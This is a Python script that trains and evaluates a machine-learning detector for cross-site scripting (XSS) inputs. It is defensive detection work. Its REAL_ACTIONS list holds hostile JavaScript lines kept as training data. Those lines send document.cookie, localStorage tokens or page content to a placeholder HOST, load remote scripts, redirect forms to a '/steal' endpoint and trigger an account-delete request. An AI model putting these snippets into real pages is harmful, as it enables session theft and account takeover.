"""Train and evaluate the XSS detector, and save it as a pickle file.

Usage:  python src/train_xss.py [--target-fpr 0.001]

Writes models/xss_model.pkl (the model) and models/xss_metrics.json (its scores).

Three evaluations are reported, from most to least flattering:
  1. Held-out test split of the combined data.
  2. Challenge set: hand-written inputs in data/challenge/ that are never trained on.
  3. External benchmark from prepare_external.py, which nothing is fitted or tuned on.
"""
from __future__ import annotations

import argparse
import json
import random
import re
import sys
import time
from pathlib import Path

import numpy as np
import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import average_precision_score, roc_auc_score
from sklearn.model_selection import train_test_split
from sklearn.pipeline import Pipeline

sys.path.insert(0, str(Path(__file__).resolve().parent))
import synthetic  # noqa: E402
from xss_model import MODEL_PATH, ROOT, WINDOW, normalize, save_model, score, windows  # noqa: E402
from xss_data import read_rows  # noqa: E402

DATA_PATH = ROOT / "data" / "processed" / "xss.csv"
SEED = 42
MAX_BENIGN_WINDOWS = 8

VARIANT_SHARE = 0.35  # share of alert()-style training attacks that also get a realistic variant
_POC_CALL = re.compile(r"(?:alert|prompt|confirm)\s*\([^()]*\)")
REAL_ACTIONS = [  # lowercase, like all normalised text
    "fetch('https://HOST/c?'+document.cookie)",
    "location='https://HOST/?c='+document.cookie",
    "new image().src='//HOST/log?'+document.cookie",
    "eval(atob('zmv0y2goji8vcy5jby8ikq=='))",
    "document.location.href='http://HOST/'",
    "navigator.sendbeacon('https://HOST/b',localstorage.getitem('token'))",
    "import('//HOST/x.js')",
    "document.write('<img src=//HOST/'+document.cookie+'>')",
    "window.open('https://HOST/login')",
    "fetch('/api/account/delete',{method:'post'})",
    "document.forms[0].action='https://HOST/steal'",
    "$.getscript('//HOST/hook.js')",
    "settimeout(function(){location.replace('//HOST')},100)",
    "this.src='https://HOST/?'+btoa(document.body.innerhtml)",
    "top.location='//HOST'",
    "steal()",
    "x()",
]


def build_pipeline() -> Pipeline:
    return Pipeline(
        [
            # Character n-grams pick up fragments such as "<scr", "rror=" and "ipt:"
            # wherever they appear, without needing a tokenizer that attackers can dodge.
            ("tfidf", TfidfVectorizer(analyzer="char", ngram_range=(1, 4), min_df=3, sublinear_tf=True, lowercase=False)),
            ("clf", LogisticRegression(C=10, max_iter=2000, class_weight="balanced")),
        ]
    )


def training_chunks(df: pd.DataFrame) -> tuple[list[str], list[int]]:
    """Cut training texts down to the window size the model scores at.

    Long benign texts contribute several windows, so the model also sees the middle
    of large harmless files. Attack samples contribute only their first window: a
    later window may not contain the payload and would be mislabelled.
    """
    texts: list[str] = []
    labels: list[int] = []
    for text, label in zip(df["text"], df["label"]):
        if label == 1 or len(text) <= WINDOW:
            chunks = [text[:WINDOW]]
        else:
            chunks = windows(text)
            if len(chunks) > MAX_BENIGN_WINDOWS:
                picks = np.linspace(0, len(chunks) - 1, MAX_BENIGN_WINDOWS).astype(int)
                chunks = [chunks[i] for i in picks]
        texts.extend(chunks)
        labels.extend([label] * len(chunks))
    return texts, labels


def realistic_variants(attacks: pd.Series) -> list[str]:
    """Copies of some training attacks with the proof-of-concept call swapped for a real action.

    Nearly every dataset payload calls alert(1). Real attacks steal cookies or redirect
    instead, so without this the model leans on "alert(" and underrates `onclick=fetch(...)`.
    Applied to training rows only, so no variant of a test attack leaks into training.
    """
    rng = random.Random(SEED)
    out = []
    for text in attacks:
        if _POC_CALL.search(text) and rng.random() < VARIANT_SHARE:
            host = f"{rng.choice(synthetic.WORDS)}{rng.randint(1, 99)}.{rng.choice(synthetic.TLDS)}"
            action = rng.choice(REAL_ACTIONS).replace("HOST", host)
            out.append(_POC_CALL.sub(lambda _: action, text))
    return out


def fit(df: pd.DataFrame) -> Pipeline:
    texts, labels = training_chunks(df)
    variants = [v[:WINDOW] for v in realistic_variants(df.loc[df["label"] == 1, "text"])]
    return build_pipeline().fit(texts + variants, labels + [1] * len(variants))


def threshold_for_fpr(y: np.ndarray, s: np.ndarray, fpr: float) -> float:
    """Lowest threshold that lets through at most `fpr` of the benign samples."""
    benign = np.sort(s[y == 0])[::-1]
    allowed = int(np.floor(fpr * len(benign)))
    return float(benign[allowed]) if allowed < len(benign) else 0.0


def evaluate(y: np.ndarray, s: np.ndarray, threshold: float) -> dict:
    flagged = s > threshold
    tp, fp = int((flagged & (y == 1)).sum()), int((flagged & (y == 0)).sum())
    fn, tn = int((~flagged & (y == 1)).sum()), int((~flagged & (y == 0)).sum())
    return {
        "samples": int(len(y)),
        "roc_auc": round(float(roc_auc_score(y, s)), 5),
        "pr_auc": round(float(average_precision_score(y, s)), 5),
        "detection_at_1pct_false_alarms": round(float((s[y == 1] > threshold_for_fpr(y, s, 0.01)).mean()), 4),
        "detection_at_0.1pct_false_alarms": round(float((s[y == 1] > threshold_for_fpr(y, s, 0.001)).mean()), 4),
        "threshold": round(threshold, 4),
        "detection_rate": round(tp / max(tp + fn, 1), 4),
        "false_alarm_rate": round(fp / max(fp + tn, 1), 4),
        "precision": round(tp / max(tp + fp, 1), 4),
        "confusion": {"tp": tp, "fp": fp, "fn": fn, "tn": tn},
    }


def show(title: str, m: dict) -> None:
    c = m["confusion"]
    print(f"\n{title}  ({m['samples']} samples)")
    print(f"  ROC AUC {m['roc_auc']:.4f} | PR AUC {m['pr_auc']:.4f}")
    print(f"  detection at 1% false alarms:   {m['detection_at_1pct_false_alarms']:.1%}")
    print(f"  detection at 0.1% false alarms: {m['detection_at_0.1pct_false_alarms']:.1%}")
    print(
        f"  at threshold {m['threshold']:.3f}: detection {m['detection_rate']:.1%}, "
        f"false alarms {m['false_alarm_rate']:.2%}, precision {m['precision']:.1%} "
        f"(caught {c['tp']}, missed {c['fn']}, false alarms {c['fp']}, correct benign {c['tn']})"
    )


def by_source(test: pd.DataFrame, scores: np.ndarray, threshold: float) -> dict:
    """Detection and false-alarm rate per data source at the chosen threshold."""
    out = {}
    print("\n  per source at that threshold:")
    for source, rows in test.assign(flagged=scores > threshold).groupby("source"):
        attacks, benign = rows[rows["label"] == 1], rows[rows["label"] == 0]
        out[source] = {
            "attacks": len(attacks), "caught": int(attacks["flagged"].sum()),
            "benign": len(benign), "false_alarms": int(benign["flagged"].sum()),
        }
        caught = f"caught {out[source]['caught']}/{len(attacks)} attacks" if len(attacks) else "no attacks"
        print(f"    {source:<11} {caught}, {out[source]['false_alarms']}/{len(benign)} false alarms")
    return out


def challenge(model: Pipeline, threshold: float) -> dict | None:
    """Score the hand-written challenge set and list every mistake."""
    folder = ROOT / "data" / "challenge"
    if not (folder / "attacks.txt").exists():
        return None
    read = lambda name: [line for line in (folder / name).read_text(encoding="utf-8").splitlines() if line.strip()]  # noqa: E731
    attacks, benign = read("attacks.txt"), read("benign.txt")
    attack_scores, benign_scores = score(model, attacks), score(model, benign)
    missed = [(float(s), t) for t, s in zip(attacks, attack_scores) if s <= threshold]
    false_alarms = [(float(s), t) for t, s in zip(benign, benign_scores) if s > threshold]

    print(f"\nChallenge set (hand-written, never trained on) at threshold {threshold:.3f}")
    print(f"  attacks caught: {len(attacks) - len(missed)}/{len(attacks)}")
    for s, text in missed:
        print(f"    missed       {s:.3f}  {text[:90]}")
    print(f"  false alarms:   {len(false_alarms)}/{len(benign)}")
    for s, text in false_alarms:
        print(f"    false alarm  {s:.3f}  {text[:90]}")
    return {
        "attacks": len(attacks), "caught": len(attacks) - len(missed), "missed": [t for _, t in missed],
        "benign": len(benign), "false_alarms": [t for _, t in false_alarms],
    }


def external(model, threshold: float, known: set[str]) -> dict | None:
    """Score the evaluation-only benchmark from prepare_external.py, when it exists.

    `known` holds every normalised project row. Attack lines that match one exactly
    were possibly trained on, so the lines that match none are also reported alone.
    """
    path = ROOT / "data" / "processed" / "xss_external.csv"
    if not path.exists():
        return None
    df = pd.read_csv(path, keep_default_na=False)
    df = df.assign(flagged=score(model, df["text"].tolist(), normalized=True) > threshold, unseen=~df["text"].isin(known))
    out = {"attack_sources": {}, "benign_sources": {}}
    print(f"\nExternal benchmark (never trained on) at threshold {threshold:.3f}")
    for source, rows in df.groupby("source"):
        if rows["label"].iloc[0] == 1:
            fresh = rows[rows["unseen"]]
            out["attack_sources"][source] = {"attacks": len(rows), "caught": int(rows["flagged"].sum()),
                                             "unseen_attacks": len(fresh), "unseen_caught": int(fresh["flagged"].sum())}
        else:
            out["benign_sources"][source] = {"benign": len(rows), "false_alarms": int(rows["flagged"].sum())}
    attacks, benign = df[df["label"] == 1], df[df["label"] == 0]
    fresh = attacks[attacks["unseen"]]
    out.update(attacks=len(attacks), caught=int(attacks["flagged"].sum()), unseen_attacks=len(fresh),
               unseen_caught=int(fresh["flagged"].sum()), benign=len(benign), false_alarms=int(benign["flagged"].sum()),
               false_alarm_examples=benign.loc[benign["flagged"], "text"].str.slice(0, 200).head(20).tolist())
    print(f"  attacks caught: {out['caught']}/{out['attacks']}  |  not in any project data: {out['unseen_caught']}/{out['unseen_attacks']}")
    print(f"  false alarms:   {out['false_alarms']}/{out['benign']}")
    return out


def split_data(data: Path, exclude_sources: tuple[str, ...] = ()) -> tuple[pd.DataFrame, dict, pd.DataFrame, pd.DataFrame, pd.DataFrame]:
    """Read, clean and split `data`: (all rows, cleaning report, train, validation, test).

    Every trainer uses this one function, so different models are fitted and compared
    on exactly the same rows. Rows from `exclude_sources` are dropped before splitting,
    for example a dataset whose license does not allow your use.
    """
    df, cleaning = read_rows(data)
    if exclude_sources:
        excluded = df["source"].isin(exclude_sources)
        cleaning["excluded_sources"] = sorted(exclude_sources)
        cleaning["excluded_source_rows"] = int(excluded.sum())
        df = df[~excluded].reset_index(drop=True)
        print(f"Excluded sources {', '.join(sorted(exclude_sources))}: removed {int(excluded.sum())} rows.")
    reserved = {normalize(line) for path in (ROOT / "data" / "challenge").glob("*.txt")
                for line in path.read_text(encoding="utf-8").splitlines() if line.strip()}
    overlap = df["text"].isin(reserved)
    cleaning["challenge_overlap_rows_removed"] = int(overlap.sum())
    df = df[~overlap].reset_index(drop=True)
    if overlap.any():
        print(f"Reserved challenge set: removed {int(overlap.sum())} overlapping training rows.")
    counts = df["label"].value_counts()
    if set(counts.index) != {0, 1} or counts.min() < 10:
        raise ValueError("Training needs at least 10 distinct cleaned samples of EACH class; use much more for meaningful evaluation.")
    # A source with only a handful of rows cannot be split three ways on its own.
    strata = df["source"] + ":" + df["label"].astype(str)
    strata = strata.where(strata.map(strata.value_counts()) >= 10, "small" + df["label"].astype(str))
    try:
        train, rest = train_test_split(df, test_size=0.30, stratify=strata, random_state=SEED)
        val, test = train_test_split(rest, test_size=0.50, stratify=strata[rest.index], random_state=SEED)
    except ValueError:
        print("Small source groups: stratifying by label only.")
        train, rest = train_test_split(df, test_size=0.30, stratify=df["label"], random_state=SEED)
        val, test = train_test_split(rest, test_size=0.50, stratify=rest["label"], random_state=SEED)
    print(f"train {len(train)} | validation {len(val)} | test {len(test)}")
    return df, cleaning, train, val, test


def train(data: Path = DATA_PATH, out: Path = MODEL_PATH, target_fpr: float = 0.001, exclude_sources: tuple[str, ...] = ()) -> dict:
    """Train on `data`, evaluate, save the pickle file and the metrics. Returns the metrics."""
    if not 0 <= target_fpr <= 1:
        raise ValueError("target_fpr must be between 0 and 1")
    df, cleaning, train, val, test = split_data(data, exclude_sources)

    start = time.time()
    model = fit(train)
    print(f"trained in {time.time() - start:.0f}s, {len(model.named_steps['tfidf'].vocabulary_)} features")

    # Tune the threshold on validation data, never on the test set. It is not allowed
    # below 0.5: a tiny threshold fits this data but over-reacts to unfamiliar input.
    val_scores = score(model, val["text"].tolist(), normalized=True)
    threshold = max(0.5, threshold_for_fpr(val["label"].to_numpy(), val_scores, target_fpr))

    metrics = {"threshold": threshold, "target_fpr": target_fpr, "rows": int(len(df)), "sources": sorted(df["source"].unique()), "cleaning": cleaning}
    test_scores = score(model, test["text"].tolist(), normalized=True)
    metrics["held_out_test"] = evaluate(test["label"].to_numpy(), test_scores, threshold)
    show("Held-out test split", metrics["held_out_test"])
    metrics["held_out_test"]["by_source"] = by_source(test, test_scores, threshold)

    metrics["challenge_set"] = challenge(model, threshold)
    metrics["external_benchmark"] = external(model, threshold, set(df["text"]))

    save_model(model, threshold, out)
    metrics_path = out.with_name(out.stem.replace("_model", "") + "_metrics.json")
    metrics_path.write_text(json.dumps(metrics, indent=2), encoding="utf-8")
    print(f"\nsaved {out} and {metrics_path}")
    return metrics


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--data", type=Path, default=DATA_PATH)
    parser.add_argument("--out", type=Path, default=MODEL_PATH)
    parser.add_argument("--target-fpr", type=float, default=0.001, help="false-alarm rate the threshold is tuned for")
    parser.add_argument("--exclude-source", action="append", default=[], help="drop rows of this source before splitting (repeatable)")
    args = parser.parse_args()
    if not args.data.exists():
        sys.exit(f"no data at {args.data}: run  python src/prepare_data.py  first")
    try:
        train(args.data, args.out, args.target_fpr, exclude_sources=tuple(args.exclude_source))
    except ValueError as error:
        parser.error(str(error))


if __name__ == "__main__":
    main()
